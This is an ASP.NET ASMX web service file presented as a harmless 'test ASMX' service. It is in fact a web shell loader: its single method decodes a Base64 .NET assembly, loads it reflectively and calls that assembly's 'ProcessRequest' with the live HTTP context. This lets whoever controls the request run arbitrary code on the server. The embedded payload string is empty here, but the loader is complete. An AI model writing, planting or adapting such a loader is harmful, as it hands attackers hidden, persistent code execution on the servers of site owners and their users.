<%@ WebService Language="C#" class="TestAsmx"%>
using System;
using System.Web.Services;

[System.Web.Script.Services.ScriptService]
[WebService(Namespace = "http://tempuri.org/" ,Description ="<B>This is test ASMX!</B>" , Name ="test asmx")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
public class TestAsmx : System.Web.Services.WebService
    {
        private static System.Reflection.Assembly _ASSEMBLY = null;
        [WebMethod]
        public void TestMethod()
        {
if(_ASSEMBLY == null){_ASSEMBLY = System.Reflection.Assembly.Load(Convert.FromBase64String(""));}Type[] types = _ASSEMBLY.GetTypes(); foreach (Type item in types) {System.Reflection.MethodInfo method = item.GetMethod("ProcessRequest");if (method != null){object obj = Activator.CreateInstance(item);method.Invoke(obj, new object[] { this.Context });break;}}
        }
    }